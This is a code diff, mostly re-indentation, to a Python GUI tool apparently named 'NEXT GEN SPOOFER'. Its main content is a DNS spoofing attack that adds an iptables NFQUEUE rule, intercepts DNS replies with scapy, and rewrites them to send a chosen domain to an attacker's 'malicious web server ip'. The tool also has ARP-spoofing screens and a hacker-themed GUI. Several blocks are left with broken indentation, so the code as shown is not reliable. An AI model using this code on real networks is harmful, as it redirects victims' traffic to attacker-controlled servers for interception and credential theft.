@@ -496,13 +496,13 @@ class ARP_all(Frame):
 #--------------------------------------------- DNS SPOOF ---------------------------------------------
 
 class DNS_attk(Frame):
-    def __init__(self, master):
+	def __init__(self, master):
 		
 		# Launch DNS SPOOF
-        def threading_dns():
+		def threading_dns():
 			t1=Thread(target=dns_spoof)
 			t1.start()
-			
+
 			# HACKER PC
 			item=canvas.create_image((250, 50), anchor=CENTER, image=hacker_pc, tag="hacker_pc")
 			canvas.itemconfig("hacker_pc", image=hacker_pc)
@@ -514,106 +514,106 @@ class DNS_attk(Frame):
 			canvas.update()
 			canvas.pack()
             
-        def modify_packet(packet):
-            """
-            Modifies the DNS Resource Record `packet`
-            to map our globally defined `dns_hosts` dictionary.
-            I.E, whenever we see a google.com answer, this function replaces 
-            the real IP address (172.217.19.142) with fake IP address (your malicious web server ip)
-            """
-            # GET INPUT DNS NAME AND IP
-            x = self.saisie_dnsname.get()
-            y = self.saisie_dnsip.get()
-            
-            dns_hosts = {b"{0}.".format(x): "{0}".format(y)}
-            
-            # get the DNS question name, the domain name
-            qname = packet[DNSQR].qname
-            
-            if qname not in dns_hosts:
-                # if the website isn't in our record -> no modif
-                self.text_box.insert("end-1c", "NO MODIF: {0} \n".format(qname))
-                return packet
+	def modify_packet(packet):
+		"""
+		Modifies the DNS Resource Record `packet`
+		to map our globally defined `dns_hosts` dictionary.
+		I.E, whenever we see a google.com answer, this function replaces 
+		the real IP address (172.217.19.142) with fake IP address (your malicious web server ip)
+		"""
+		# GET INPUT DNS NAME AND IP
+		x = self.saisie_dnsname.get()
+		y = self.saisie_dnsip.get()
+
+		dns_hosts = {b"{0}.".format(x): "{0}".format(y)}
+
+		# get the DNS question name, the domain name
+		qname = packet[DNSQR].qname
+
+		if qname not in dns_hosts:
+		# if the website isn't in our record -> no modif
+		self.text_box.insert("end-1c", "NO MODIF: {0} \n".format(qname))
+		return packet
                 
-            # craft new answer, overriding the original
-            # setting the rdata for the IP we want to redirect (spoofed)
-            # for instance, google.com will be mapped to "192.168.40.113"
-            x = qname
-            self.dnsreqtxt=canvas.create_text((400, 75), anchor=NW, text=x, tag="gui_ip", fill="#99aaff")
-            self.dnsreq=canvas.create_line(480,30,320,30, arrow=tk.LAST, fill="#99aaff", width="7")
-            time.sleep(0.5)
-            canvas.delete(self.dnsreq)
-            canvas.delete(self.dnsreqtxt)
-            
-            packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-            
-            # set the answer count to 1
-            packet[DNS].ancount = 1
-            # delete checksums and length of packet, because we have modified the packet
-            # new calculations are required (scapy will do automatically)
-            del packet[IP].len
-            del packet[IP].chksum
-            del packet[UDP].len
-            del packet[UDP].chksum
-            
-            # return the modified packet
-            return packet
-            
-        def process_packet(packet):
-			self.text_box.insert("end-1c", "MODIFYING\n")
-			
-			'''Whenever a new packet is redirected to the netfilter queue,
-			this callback is called.'''
-			
-			# convert netfilter queue packet to scapy packet
-			scapy_packet = IP(packet.get_payload())
-			if scapy_packet.haslayer(DNSRR):
-				# if the packet is a DNS Resource Record (DNS reply) -> MODIF 
-				self.text_box.insert("end-1c", "[Before]: {0} \n".format(scapy_packet.summary()))
-				#y = scapy_packet.summary()
-				try:
-					scapy_packet = modify_packet(scapy_packet)
-				except IndexError:
-					# not UDP packet, this can be IPerror/UDPerror packets
-					pass
-				self.text_box.insert("end-1c", "[After ]: {0}\n ".format(scapy_packet.summary()))
-				z = scapy_packet.summary()
-                # set back as netfilter queue packet
-				packet.set_payload(bytes(scapy_packet))
-				
+		# craft new answer, overriding the original
+		# setting the rdata for the IP we want to redirect (spoofed)
+		# for instance, google.com will be mapped to "192.168.40.113"
+		x = qname
+		self.dnsreqtxt=canvas.create_text((400, 75), anchor=NW, text=x, tag="gui_ip", fill="#99aaff")
+		self.dnsreq=canvas.create_line(480,30,320,30, arrow=tk.LAST, fill="#99aaff", width="7")
+		time.sleep(0.5)
+		canvas.delete(self.dnsreq)
+		canvas.delete(self.dnsreqtxt)
 
-			packet.accept()
-			self.dnsfakaddrtxt=canvas.create_text((290, 85), anchor=NW, text=z, tag="gui_ip", fill="red")
-			self.dnsfakaddr=canvas.create_line(320,55,480,55, arrow=tk.LAST, fill="red", width="7")
-			time.sleep(1)
-			canvas.delete(self.dnsfakaddr)
-			canvas.delete(self.dnsfakaddrtxt)
-			# DNS GUI RED ( after IP Addr )
+		packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+
+		# set the answer count to 1
+		packet[DNS].ancount = 1
+		# delete checksums and length of packet, because we have modified the packet
+		# new calculations are required (scapy will do automatically)
+		del packet[IP].len
+		del packet[IP].chksum
+		del packet[UDP].len
+		del packet[UDP].chksum
+
+		# return the modified packet
+		return packet
+            
+	def process_packet(packet):
+		self.text_box.insert("end-1c", "MODIFYING\n")
+
+		'''Whenever a new packet is redirected to the netfilter queue,
+		this callback is called.'''
+
+		# convert netfilter queue packet to scapy packet
+		scapy_packet = IP(packet.get_payload())
+		if scapy_packet.haslayer(DNSRR):
+			# if the packet is a DNS Resource Record (DNS reply) -> MODIF 
+			self.text_box.insert("end-1c", "[Before]: {0} \n".format(scapy_packet.summary()))
+			#y = scapy_packet.summary()
+			try:
+				scapy_packet = modify_packet(scapy_packet)
+			except IndexError:
+				# not UDP packet, this can be IPerror/UDPerror packets
+				pass
+			self.text_box.insert("end-1c", "[After ]: {0}\n ".format(scapy_packet.summary()))
+			z = scapy_packet.summary()
+	# set back as netfilter queue packet
+			packet.set_payload(bytes(scapy_packet))
+
+
+		packet.accept()
+		self.dnsfakaddrtxt=canvas.create_text((290, 85), anchor=NW, text=z, tag="gui_ip", fill="red")
+		self.dnsfakaddr=canvas.create_line(320,55,480,55, arrow=tk.LAST, fill="red", width="7")
+		time.sleep(1)
+		canvas.delete(self.dnsfakaddr)
+		canvas.delete(self.dnsfakaddrtxt)
+		# DNS GUI RED ( after IP Addr )
 
 			
-        def dns_spoof():
-			QUEUE_NUM = 0
-			# insert the iptables FORWARD rule
-			os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-			# instantiate the netfilter queue
-			queue = NetfilterQueue()
-			queue.bind(QUEUE_NUM, process_packet)
-			nfqueue_check=os.popen('iptables -S').readlines()
-			for i in nfqueue_check:
-				if "NFQUEUE" in i:
-					canvas1.itemconfig("smile", image=img2)
-			queue.run()
+	def dns_spoof():
+		QUEUE_NUM = 0
+		# insert the iptables FORWARD rule
+		os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+		# instantiate the netfilter queue
+		queue = NetfilterQueue()
+		queue.bind(QUEUE_NUM, process_packet)
+		nfqueue_check=os.popen('iptables -S').readlines()
+		for i in nfqueue_check:
+			if "NFQUEUE" in i:
+				canvas1.itemconfig("smile", image=img2)
+		queue.run()
                 
         def dns_kill():
             
-            #IMPORTANT !!
-            os.system("iptables -F")
-            queue = NetfilterQueue()
-            queue.unbind()
-            self.text_box.insert("end-1c", "yo mama is so fat, she outweighted this application \n")
-            
-            # RED LIGHT
-            canvas1.itemconfig("smile", image=img1)
+		#IMPORTANT !!
+		os.system("iptables -F")
+		queue = NetfilterQueue()
+		queue.unbind()
+		self.text_box.insert("end-1c", "yo mama is so fat, she outweighted this application \n")
+
+		# RED LIGHT
+		canvas1.itemconfig("smile", image=img1)
         
         Frame.__init__(self, master)
        
@@ -697,26 +697,26 @@ class DNS_attk(Frame):
 #--------------------------------------------- ABOUT THE PROJECT ---------------------------------------------
 
 class about_nc(Frame):
-    def __init__(self, master):
+	def __init__(self, master):
 		       
 		Frame.__init__(self, master)
-	
+
 		self.label_if = Label(self, text="         ☠ About ☠           ", font = ( "Courier" , 20 ), bg='red', pady=30, padx=128)
 		self.label_if.pack()
-		
+
 		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
-		
+
 		self.canvas_a = tk.Canvas(self, width=160, height=160, bg="black", highlightthickness=0)
 		self.canvas_a.pack()
 		self.logo = ImageTk.PhotoImage(Image.open('logo.png'))
 		self.canvas_a.create_image(160,160,image=self.logo,anchor='se') 
-		
+
 		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
-		
+
 		# HELP text
 		self.dt = Label(self, text="Here are some help to get to know our tool : ", font = ( "Courier" , 13 ), bg='red')
 		self.dt.pack()
@@ -729,40 +729,40 @@ class about_nc(Frame):
 		self.dt.pack()
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
-		
+
 		self.canvas_a = tk.Canvas(self, width=400, height=150, bg="black", highlightthickness=0)
 		self.canvas_a.pack()
-		
+
 		# SPOOF ARROW
 		self.spoof=self.canvas_a.create_text(100,35, text="SPOOF", font = ( "Courier" , 9  ), fill="green")
 		self.spoof=self.canvas_a.create_line(50,20,170,20, arrow=tk.LAST, fill="green", width="7")
-		
+
 		# ICMP ARROW
 		self.icmp=self.canvas_a.create_text(300,35, text="Redirecting ICMP", font = ( "Courier" , 9  ), fill="purple")
 		self.arrow=self.canvas_a.create_line(355,20,235,20, arrow=tk.LAST, fill="purple", width="7")
-		
+
 		# CROSS
 		self.icmp=self.canvas_a.create_text(200,90, text="Not redirecting", font = ( "Courier" , 9  ), fill="red")
 		self.cross=self.canvas_a.create_text(200,60, text="X", font = ( "Courier" , 30  ), fill="red")
-	
-		
+
+
 		self.dt = Label(self, text="                DNS SPOOF                ", font = ( "Courier" , 12 ), bg='white')
 		self.dt.pack()
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
-		
+
 		self.canvas_b = tk.Canvas(self, width=400, height=100, bg="black", highlightthickness=0)
 		self.canvas_b.pack()
-		
+
 		# SPOOF ARROW
 		self.dns=self.canvas_b.create_text(100,35, text="DNS Response from hacker", font = ( "Courier" , 9  ), fill="red")
 		self.dns=self.canvas_b.create_line(50,20,170,20, arrow=tk.LAST, fill="red", width="7")
-		
+
 		# ICMP ARROW
 		self.icmp=self.canvas_b.create_text(300,35, text="DNS Request (client)", font = ( "Courier" , 9  ), fill="#99aaff")
 		self.arrow=self.canvas_b.create_line(355,20,235,20, arrow=tk.LAST, fill="#99aaff", width="7")
-		
-		
+
+
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.dt = Label(self, text="Copyright ( © ) 2021 KL \n This program comes with ABSOLUTELY NO WARRANTY ! \n It is a free software, and you are welcome to redistribute it under certain conditions. ", font = ( "Courier" , 10 ), bg='red')
@@ -773,8 +773,7 @@ class about_nc(Frame):
 
         
 if __name__ == "__main__":
-
-    app = dreamteam()
-    app.title("NEXT GEN SPOOFER")
-    app.configure(bg='black')
-    app.mainloop()
+	app = dreamteam()
+	app.title("NEXT GEN SPOOFER")
+	app.configure(bg='black')
+	app.mainloop()
